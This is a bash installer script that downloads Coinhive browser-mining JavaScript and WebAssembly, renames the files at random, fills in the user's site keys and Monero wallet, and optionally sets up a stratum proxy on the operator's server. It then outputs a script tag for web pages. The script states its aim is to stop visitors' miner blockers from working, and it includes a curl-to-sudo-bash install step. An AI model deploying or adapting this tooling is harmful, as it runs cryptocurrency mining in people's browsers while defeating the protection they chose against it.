echo Generating random file name...
minerblock=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
coinhive=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
cryptonight=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".wasm"
echo Downloading script...
wget -O $minerblock https://rawgit.com/SkyrisBactera/AntiMinerblock/master/minerblock.js >/dev/null 2>/dev/null
wget -O $coinhive https://coinhive.com/lib/coinhive.min.js >/dev/null 2>/dev/null
wget -O $cryptonight https://coinhive.com/lib/cryptonight.wasm >/dev/null 2>/dev/null
echo What is your Coinhive site key?
read cHiveKey
echo What is your Crypto-loot site key?
read cLootKey
echo What is your CLOUDCOINS site key?
read cCoinsKey
echo Substituting the keys and filenames into $minerblock...
sed -i 's/cHive/'$cHiveKey'/g' $minerblock
sed -i 's/cLoot/'$cLootKey'/g' $minerblock
sed -i 's/cCoins/'$cCoinsKey'/g' $minerblock
sed -i 's/locCoin/'$coinhive'/g' $minerblock
echo "Do you want to enable proxy functionality? This is very recommended, however, your computer/server would have to host it (y/n)"
read proxyYes
declare -l proxyYes
proxyYes=$proxyYes
clear
if [ "$proxyYes" == "y" ]; then
  echo Checking dependencies...
  if hash npm 2>/dev/null; then
    echo Enter your password in order to install the proxy software
    sudo npm install -g coin-hive-stratum
  else
    echo Installing node...
    curl -sL https://deb.nodesource.com/setup_9.x | sudo -E bash -
    echo Enter your password in order to install Node.js
    sudo apt-get install -y nodejs
    sudo npm install -g coin-hive-stratum
  fi
  echo "What is your Monero wallet address?"
  read walletId
  echo "Do you have a domain name? (y/n)"
  read domainYes
  declare -l domainYes
  domainYes=$domainYes
  if [ "$domainYes" == "y" ]; then
    echo What is your domain name?
    read domainName
  else
    domainName=$(dig +short myip.opendns.com @resolver1.opendns.com)
  fi
    echo "What is the URL for this directory? Example: https://fish.com/public"
    read directory
    echo Substituting the proxy into $minerblock...
    #port=$(shuf -i 2000-65000 -n 1)
    port=80
    # This was such a pain in the a**
    sed -i 's~//strSub~''CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://'$domainName':'$port'"]];''~g' $minerblock
    sed -i 's~"https://coinhive.com/lib/"~new URL("'$directory'").href~g' $coinhive
    sed -i 's~\\"https:\\\/\\\/coinhive.com\\\/lib\\\/\\"~new URL(\\"'$directory'\\").href~g' $coinhive
    sed -i 's~https~http~g' $coinhive
    sed -i 's/cryptonight.wasm/'$cryptonight'/g' $coinhive
    echo Generating proxy.sh...
    echo "coin-hive-stratum "$port" --host=pool.supportxmr.com --port=3333 --login="$walletId > proxy.sh
    clear
    echo You need to run proxy.sh along with whatever server software you are using as long as you want Coinhive to work
    echo Make sure to open port $port, otherwise your users may be able to bypass this
fi
  echo You need to put the following into your HTML files that you want to have protection against Minerblockers:
  echo '<script src="'$minerblock'"></script>'
